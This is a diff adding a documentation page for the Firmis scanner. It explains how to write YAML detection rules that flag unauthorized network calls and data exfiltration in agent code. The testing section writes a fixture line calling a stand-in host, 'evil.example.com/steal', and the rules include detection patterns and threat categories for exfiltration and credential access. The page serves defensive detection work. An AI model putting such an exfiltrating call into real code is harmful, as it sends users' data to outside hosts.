@@ -1,6 +1,254 @@
 ---
 title: Custom Rules
-description: How to write and load custom detection rules for Firmis.
+description: Write and load your own YAML detection rules to extend Firmis with project-specific threat patterns.
 ---
 
-Content coming soon.
+import { Aside } from '@astrojs/starlight/components';
+
+> Custom rules use the same YAML schema as built-in rules. Write one, point Firmis at it, and your pattern runs alongside the 209 built-in rules on every scan.
+
+## Complete example
+
+Copy this file, adjust the patterns to match your threat, and run `npx firmis validate` to confirm it parses correctly.
+
+```yaml title="rules/custom/network-policy.yaml"
+rules:
+  - id: custom-001
+    name: Detect unauthorized API calls
+    description: |
+      Detects tool handlers making API calls to unauthorized domains.
+      Only requests to api.example.com are permitted by policy.
+    category: network-abuse
+    severity: high
+    version: "1.0.0"
+    enabled: true
+    confidenceThreshold: 75
+    platforms:
+      - mcp
+      - claude
+    patterns:
+      - type: regex
+        pattern: 'fetch\s*\(\s*[''"]https?://(?!api\.example\.com)'
+        weight: 85
+        description: HTTP request to non-allowlisted domain
+    remediation: |
+      Restrict fetch calls to approved API domains using an allowlist.
+      Use an environment variable for the base URL and validate it at startup.
+    references:
+      - https://owasp.org/www-project-top-10-for-large-language-model-applications/
+```
+
+---
+
+## Full YAML schema
+
+Every field with its type, whether it is required, and what it does:
+
+```yaml title="Full schema (annotated)"
+rules:
+  - id: string              # REQUIRED. Unique identifier. Use a prefix to avoid
+                            #   collisions with built-in rules (e.g. "custom-", "acme-").
+                            #   Must match: /^[a-z][a-z0-9-]*$/
+
+    name: string            # REQUIRED. Short human label shown in scan output.
+                            #   Keep under 60 characters.
+
+    description: string     # REQUIRED. What this rule detects and why it matters.
+                            #   Supports multi-line YAML block scalar (|).
+
+    category: string        # REQUIRED. Threat category slug. Built-in categories:
+                            #   tool-poisoning, prompt-injection, credential-access,
+                            #   secret-detection, data-exfiltration, network-abuse,
+                            #   supply-chain, access-control, insecure-config,
+                            #   resource-abuse, persistence, lateral-movement,
+                            #   defense-evasion, collection, execution, discovery
+
+    severity: string        # REQUIRED. One of: critical | high | medium | low
+
+    version: string         # Optional. Semver string for change tracking.
+                            #   Defaults to "1.0.0"
+
+    enabled: boolean        # Optional. Set to false to ship the rule disabled.
+                            #   Defaults to true
+
+    confidenceThreshold: number   # Optional. 0–100. A finding is only emitted when
+                                  #   the computed confidence meets this value.
+                                  #   Defaults to 50. Higher = fewer false positives.
+
+    platforms:              # Optional. Restrict the rule to specific platforms.
+      - claude              #   Omit the field to apply to ALL platforms.
+      - mcp                 #   Valid values: claude, mcp, codex, cursor, crewai,
+      - codex               #   autogpt, openclaw, nanobot
+      - cursor
+      - crewai
+      - autogpt
+      - openclaw
+      - nanobot
+
+    patterns:               # REQUIRED. At least one pattern object.
+      - type: string        #   REQUIRED. Matcher type (see table below).
+        pattern: string     #   REQUIRED. The expression to match.
+        weight: number      #   REQUIRED. 0–100. Contribution to confidence score.
+        description: string #   Optional. Label shown in verbose output.
+        flags: string       #   Optional. Regex flags for `regex` type only.
+                            #   Example: "i" for case-insensitive matching.
+
+    remediation: string     # Optional. Fix guidance shown in reports.
+                            #   Supports multi-line YAML block scalar (|).
+
+    references:             # Optional. URLs to MITRE ATT&CK, OWASP, CVEs, etc.
+      - https://example.com
+```
+
+---
+
+## Pattern type reference
+
+| Type | Description | When to use |
+|---|---|---|
+| `regex` | JavaScript regular expression against raw file content | Most patterns — flexible and well-tested |
+| `yara` | YARA-style string match (not the YARA binary) — supports `nocase`, hex strings | Simple string matches with YARA familiarity |
+| `file-access` | Matches references to specific file paths; applies `~` expansion | Detecting reads of credential or system files |
+| `import` | Matches module import statements (Python and JS/TS) | Detecting use of specific libraries |
+| `network` | Matches URL and hostname patterns | Detecting requests to suspicious domains or TLDs |
+| `string-literal` | Exact match including surrounding quotes | Known-bad package names, exact string indicators |
+| `text` | Plain substring search — no regex | Simple keyword matches where speed matters |
+
+<Aside type="caution">
+  `regex` patterns do not support PCRE inline flags like `(?i)`. Use the `flags` field instead: `flags: "i"`. Using `(?i)` will throw a runtime error when the rule is loaded.
+</Aside>
+
+---
+
+## Confidence scoring in practice
+
+The confidence score is computed as:
+
+```text
+confidence = Math.max(ratioConfidence, maxSinglePatternWeight)
+```
+
+A rule with `confidenceThreshold: 75` and a single `weight: 85` pattern will always fire when that pattern matches (85 ≥ 75). A rule with three patterns at weights 30, 40, and 50 and a threshold of 75 requires multiple patterns to co-occur — a single match (max weight 50) is suppressed.
+
+Use a **high threshold with low-weight patterns** to require co-occurrence of multiple weak signals. Use a **single high-weight pattern with a lower threshold** for precise, high-confidence single-indicator rules.
+
+---
+
+## Multi-pattern rule example
+
+This rule requires two signals — an import and a suspicious network call — before firing:
+
+```yaml title="rules/custom/exfil-via-requests.yaml"
+rules:
+  - id: custom-002
+    name: Data Exfiltration via requests Library
+    description: |
+      Detects Python agent code that imports the requests library
+      and makes calls to non-allowlisted external URLs.
+    category: data-exfiltration
+    severity: high
+    version: "1.0.0"
+    enabled: true
+    confidenceThreshold: 70
+    platforms:
+      - crewai
+      - autogpt
+    patterns:
+      - type: import
+        pattern: requests
+        weight: 40
+        description: requests library imported
+      - type: regex
+        pattern: 'requests\.(get|post|put|patch|delete)\s*\(\s*[''"]https?://'
+        weight: 75
+        description: HTTP call to external URL
+    remediation: |
+      Audit all external HTTP calls. Use an allowlist of approved domains.
+      Consider using httpx with timeout and domain validation middleware.
+```
+
+---
+
+## Validating custom rules
+
+Before deploying, validate that your YAML parses correctly and all regex patterns compile:
+
+```bash title="Terminal"
+# Validate a single file
+npx firmis validate rules/custom/network-policy.yaml
+
+# Validate an entire directory
+npx firmis validate rules/custom/
+
+# Strict mode — regex warnings become errors
+npx firmis validate --strict rules/custom/
+```
+
+Validation checks:
+- Valid YAML syntax
+- All required fields present
+- `id` matches the required format
+- `severity` is one of the four valid values
+- All `regex` patterns compile without error
+- `weight` values are in the 0–100 range
+- `confidenceThreshold` is in the 0–100 range
+
+---
+
+## Where to place custom rule files
+
+**Option 1 — `--rules` flag (one-off or CI):**
+
+```bash title="Terminal"
+npx firmis scan --rules ./rules/custom/
+```
+
+**Option 2 — Config file (persistent, team-wide):**
+
+```yaml title=".firmis.config.yaml"
+rules:
+  - ./rules/custom/network-policy.yaml
+  - ./rules/custom/exfil-rules.yaml
+```
+
+**Option 3 — `rules/` directory at project root (zero-config):**
+
+Place `*.yaml` files in a `rules/` directory at your project root. Firmis loads them automatically without any config.
+
+```text
+your-project/
+  rules/
+    custom-network.yaml   ← loaded automatically
+    custom-auth.yaml      ← loaded automatically
+  src/
+    ...
+```
+
+<Aside type="note">
+  Custom rule IDs that collide with built-in IDs override the built-in rule. Use a unique prefix (e.g., `custom-`, `acme-`, your org name) to avoid accidental overrides.
+</Aside>
+
+---
+
+## Testing a custom rule
+
+Point Firmis at a file that should trigger your rule and confirm a finding appears:
+
+```bash title="Terminal"
+# Create a test fixture
+echo 'fetch("https://evil.example.com/steal")' > /tmp/test-fixture.ts
+
+# Scan it with your custom rule
+npx firmis scan /tmp/test-fixture.ts --rules rules/custom/network-policy.yaml --severity low
+
+# Expect to see: custom-001 Detect unauthorized API calls
+```
+
+---
+
+## Related
+
+- [Rules Overview](/rules/overview) — rule anatomy, severity levels, and how loading works
+- [firmis validate](/cli/validate) — full CLI reference for the validate command
+- [Ignoring Findings](/rules/ignoring-findings) — suppress false positives from built-in or custom rules
+- [Built-in Rules](/rules/built-in-rules) — browse the 209 built-in rules for inspiration
